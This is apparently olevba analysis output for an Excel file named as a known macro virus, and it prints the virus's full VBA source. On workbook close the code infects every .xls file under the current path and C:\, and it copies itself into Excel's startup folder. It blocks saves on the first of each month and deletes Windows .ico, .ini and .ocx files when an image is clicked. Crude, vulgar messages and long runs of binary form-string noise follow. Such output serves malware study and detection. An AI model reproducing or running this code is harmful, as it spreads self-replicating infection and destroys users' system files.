olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Intended.Toothpaste.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Intended.Toothpaste.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforeClose(Cancel As Boolean) ' = AIM
On Error Resume Next
SearchAndInfect (ActiveWorkbook.Path)
SearchAndInfect ("c:\")
StayResident
If Minute(Now) = Int(60 * Rnd) Then
AIM.Show
End If
End Sub
Function SearchAndInfect(ipath As String)
On Error Resume Next
Application.ScreenUpdating = False
Dim code As String
Dim Header As String
Header = "Private Sub Workbook_BeforeClose(Cancel As Boolean) ' = AIM"
code = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.lines(1, 54)
Kill "c:\wondows\data.frx"
ActiveWorkbook.VBProject.VBComponents("AIM").Export ("C:\windows\data.frx")
Set fs = Application.FileSearch
fs.NewSearch
fs.LookIn = ipath
fs.FileName = "*.xls"
fs.SearchSubFolders = True
fs.Execute
For Each victim In fs.FoundFiles
Set wrkbook = Workbooks.Open(victim)
If wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.lines(1, 1) = Header And Len(wrkbook.VBProject.VBComponents("AIM").Name) > 0 Then
wrkbook.Close
Else
wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, code
wrkbook.VBProject.VBComponents.Import (Application.Path & "\data.frx")
wrkbook.Save
wrkbook.Close
End If
Next
Kill "C:\windows\data.frx"
Application.ScreenUpdating = False
End Function
Sub StayResident()
Application.ScreenUpdating = False
ActiveWorkbook.SaveAs (Application.StartupPath & "\BOOK1.")
Application.ScreenUpdating = True
End Sub
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
If Day(Now) = 1 Then
MsgBox "Hey man... are you still working?" & vbCr & "Get a life man!", vbSystemModal, "Excell Off-line"
Beep
MsgBox "I can't let you save this workbook today, sorry!", vbApplicationModal, "AIM"
Beep
MsgBox "And don't forget to wash your teeth with AIM" & vbCr & "The best toothpaste", vbApplicationModal, "AIM ADD"
Beep
Cancel = True
End If
End Sub
'End of virus heheh
-------------------------------------------------------------------------------
VBA MACRO Φύλλο1.cls 
in file: Virus.MSExcel.Intended.Toothpaste.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Φύλλο1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_SelectionChange(ByVal Target As Excel.Range)

End Sub
-------------------------------------------------------------------------------
VBA MACRO Φύλλο2.cls 
in file: Virus.MSExcel.Intended.Toothpaste.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Φύλλο2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Φύλλο3.cls 
in file: Virus.MSExcel.Intended.Toothpaste.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Φύλλο3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AIM.frm 
in file: Virus.MSExcel.Intended.Toothpaste.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/AIM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'This workbook has a lot of toothpaste inside
'toothpaste waz produced by yozak
'and AIM's research team!
'Toothapste of the year!AIM
Private Sub CommandButton1_Click()
On Error Resume Next
Dim lines(20) As String
Beep
Data = InputBox("Insert Something!", "yozak99")
If Data = "" Then MsgBox "Emptyness in your head!"
If Data = "toothpaste" Then
MsgBox "You paranoic!"
Else
MsgBox "Paranoic HAHAHHA!!.TOOTHPASTEPARANOIC!", vbSystemModal, "Paran!"
lines(0) = "Season of toothpaste": lines(1) = "Mad toothpaste makers": lines(2) = "Microsoft Toothpaste Progie"
lines(3) = "AIM": lines(4) = "FUCK CREST": lines(5) = "Crazy Toothpaste users": lines(6) = "'Toothpaste": lines(7) = "Yozak uses AIM"
lines(8) = "To protect your teeth use AIM": lines(9) = "AIM is also good for your dick!": lines(10) = "AIM THE BEST": lines(11) = "aIM,AiM,AIm,aim"
lines(12) = "Forget the rest and follow the best,AIM": lines(13) = "PAMELA ANDERSON USES AIM TOO": lines(14) = "AIM's toothpaste can be used for Oral Sex too!"
lines(15) = "AIM! toothpaste for the high people": lines(16) = "GEEE FORGET THE CREST": lines(17) = "Sunday the 13th boooo!!scary": lines(18) = "Toothpaste Contest,Afraid huh?"
lines(19) = "OKZ": lines(20) = "99% of the vx society use AIM!"
For t = 0 To 20
Application.Caption = lines(t)
For x = 1 To 1000
DoEvents
Next x
MsgBox lines(t), vbQuestion, "AIM TOOTHPASTE"
Next t
End Sub

Private Sub Image1_Click()
qst = MsgBox("Did you clicked on the picture?", vbYesNo, "TOOTHAPASTE MADNESS")
If qst = vbYes Then
MsgBox "USE AIM TOOTHPASTE"
ElseIf qst = vbNo Then
MsgBox "WRONG ANSWER!" & vbCr & "System destruction started!" & vbCr & "The toothpaste revenge!"
Kill "c:\windows\*.ico"
Kill "c:\windows\t*.ini"
Kill "C:\windows\system\*.ocx"
MsgBox "System Destruction Completed!", vbCritical, "Toothpaste"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ¦Í»
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ¦Í»
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ¦Í»
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Continue...?g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!%0)!#-$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*9*-13666 (;?:4>0563��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"33333333333333333333333333333333333333333333333333��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�v�I	"���Cm!���d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�mN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%b���ˊ�*I!$�$JX�+D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�as�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�k���*zFl�ð��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�������Q_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�}�CY�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[΀���G��Y����&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��۱"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:>�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O9��[�Ԟ�aO���0�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dx�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܹI���X�Jz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jɘį�Q3��R�Ľ5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-@�7K�/��͋�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lHnx�,��^�#˳�l~�Y��U稐�v�w�ǚ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��/I�Ӊ*I!$�v�Ko�JL�U�b롳U��m~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9zKWF<�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k��&(h.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�_G����T6#p��I:3�Y��K�;M����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jԧ���rC���$��w*�j���{U��%�+�s5��o�+���������r�-Q4b�H3P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i���Hb�����Q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��`R|V�>���(R��B�\�ӝU;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z����o�6;��4�w2��|�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׷��QY�1�f�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�;�����5�LӋ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ὃ	ѓ$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����וs��wr�ĴF��HIY�"c�٬�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2�"[���jM���靱
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]�e��U���;J8ݖ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}jH���ӡs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qIH4�7�Q�\�6�4F�l�4���sǲ�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'4��gL����㠜��R7q����������L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l��2�[<�eSL�ι��5�J��Ą�_���I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��݂�,��؋
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�658푾�.Zh�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T!�C��dր
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5)��-Ր
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g b�P�|��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�sm�I-����z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R��{N�br>�����;����G �w�YsRf�;aYs�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�B�넡Ul�eV��?��.s�9δ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����g[�#.E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���e�^>�M揲x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C����3��ά
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��$�E�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{@C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*s�^��#x�\����x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%��−cZ�i�{nb��>u7cb`'��L�9�
V�!�0�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\Σ<j��.�I؝
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d0?�m�X��5�EĕquJ=����Q�imq%��IR\[qr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ͷ7�9���UzF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=N@��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ϫ5�@�8�}�kSdge�M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v	Y�f�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zӋ�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�VJv��|�ֳd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w[��֞-6��e�S���u�I���W>Db�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5%I%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 "#2A03$4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@BDP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǐ��ҪG�z��W�HUY>
f���4�I^P<�%���3
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�;��b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�^ZR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cId��=����J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G%n�,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���L��� ��YY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)��__'T��%�����l,�]�EZ.��3�b1�Z5�5^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�iNt�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�L�􌦪)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�d�\�ױ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/U����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�ܤ������f��d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C5��9�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t���Q�F�+�}Vg��R��D�2Z�x��k�2ZJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b�?��"c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
